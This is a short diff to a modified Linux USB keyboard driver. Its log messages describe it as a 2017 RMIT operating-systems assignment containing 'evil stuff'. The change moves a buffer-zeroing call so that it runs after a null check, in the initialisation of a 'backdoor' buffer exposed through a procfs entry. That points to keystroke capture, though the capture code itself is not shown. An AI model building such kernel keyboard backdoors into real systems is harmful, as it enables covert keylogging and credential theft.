@@ -418,9 +418,9 @@ static int osp_backdoor_init()
 	printk(KERN_ALERT "usbkbd: USB keyboard driver started with some evil stuff, used for OSP Assignment 2 Stage 2 only.");
 	printk(KERN_ALERT "usbkbd: Modified by Ming Hu s3554025 @ RMIT University, 2017; forked from Linux kernel v4.13.");
 	printk(KERN_INFO "usbkbd: Length of maxium backdoor size: %d", osp_backdoor_buffer_maxsize);
+
 	osp_proc_entry = proc_create("osp_keyboard", 0644, NULL, &osp_proc_fops);
 	osp_backdoor_buffer = vmalloc(osp_backdoor_buffer_maxsize);
-	memset(osp_backdoor_buffer, '\0', osp_backdoor_buffer_maxsize);
 	osp_backdoor_buffer_length = 0;
 
 	if(!osp_backdoor_buffer || !osp_proc_entry)
@@ -431,6 +431,9 @@ static int osp_backdoor_init()
 	else
 	{
 		printk(KERN_ALERT "usbkbd: ProcFS initialized!");
+
+		// Wipe up the string buffer by using null chars.
+		memset(osp_backdoor_buffer, '\0', osp_backdoor_buffer_maxsize);
 		return 0;
 	}
 }
